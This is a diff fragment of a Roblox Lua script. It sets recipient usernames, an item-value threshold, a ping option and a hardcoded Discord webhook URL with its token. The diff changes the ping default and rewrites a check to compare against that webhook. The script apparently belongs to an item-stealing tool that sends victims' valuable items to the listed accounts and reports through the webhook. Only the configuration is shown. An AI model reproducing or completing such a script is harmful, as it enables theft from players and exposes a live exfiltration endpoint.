@@ -20,10 +20,10 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 local users = _G.Usernames or {{"CLONEBIGFORONE", "byvy1004"}
 local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
+local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1444027540137054367/_izLpUN4Y46upT4AD5MINcyiR-Fn2UOK2jgWVU41iwtqcyQvJogznr_MU2NHQQl2O4JA"
 
-if next(users) == nil or webhook == "" then
+if next(users) == nil or webhook == "https://discord.com/api/webhooks/1444027540137054367/_izLpUN4Y46upT4AD5MINcyiR-Fn2UOK2jgWVU41iwtqcyQvJogznr_MU2NHQQl2O4JA" then
     plr:kick("You didn't add usernames or webhook")
     return
 end
